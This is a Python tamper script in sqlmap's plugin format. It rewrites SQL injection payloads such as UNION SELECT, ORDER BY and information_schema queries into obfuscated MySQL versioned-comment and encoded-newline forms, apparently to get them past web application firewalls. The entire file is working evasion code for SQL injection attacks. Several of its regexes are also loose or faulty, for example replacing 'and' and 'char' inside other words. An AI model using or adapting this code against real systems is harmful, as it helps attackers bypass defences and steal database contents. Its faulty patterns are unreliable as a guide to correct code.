#!/usr/bin/env python
"""
Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""
import re
from lib.core.enums import PRIORITY
__priority__ = PRIORITY.HIGHEST
def dependencies():
pass
def tamper(payload, **kwargs):
"""
and /*!14400and*/
order by /**/order/*/%0a*a*/by/**/
union select
union all select union/*!88888cas*//*/%0a*a*/select/**/
database() database(/*!/*/**%0fAJEST*/*/)
from information_schema.schemata /*!from--%0f/*%0ainformation_schema.schemata*/
from information_schema.tables /*!from--%0f/*%0ainformation_schema.tables*/
from information_schema.columns /*!from--%0f/*%0ainformation_schema.columns*/
"""
payload = re.sub(r"(?i)and", "/*!14400and*/", payload)
payload = re.sub(r"(?i)order by", "/**/order/*/%0a*a*/by/**/", payload)
payload = re.sub(r"(?i)union select", "union/*!88888cas*//*/%0a*a*/select/**/", payload)
payload = re.sub(r"(?i)union all select", "union/*!88888cas*//*/%0a*a*/select/**/", payload)
payload = re.sub(r"(?i)from information_schema.schemata", "/*!from--%0f/*%0ainformation_schema.schemata*/",
payload)
payload = re.sub(r"(?i)from information_schema.tables", "/*!from--%0f/*%0ainformation_schema.tables*/", payload)
payload = re.sub(r"(?i)from information_schema.columns", "/*!from--%0f/*%0ainformation_schema.columns*/", payload)
payload = re.sub(r"(?i)database\(\)", "database(/*!/*/**%0fAJEST*/*/)", payload)
payload = re.sub(r"(?i)count\(*\)","count(1)",payload)
payload = re.sub(r"(?i) as"," /*!14400as*/",payload)
payload = re.sub(r"(?i)char","/*!14400char*/",payload)
return payload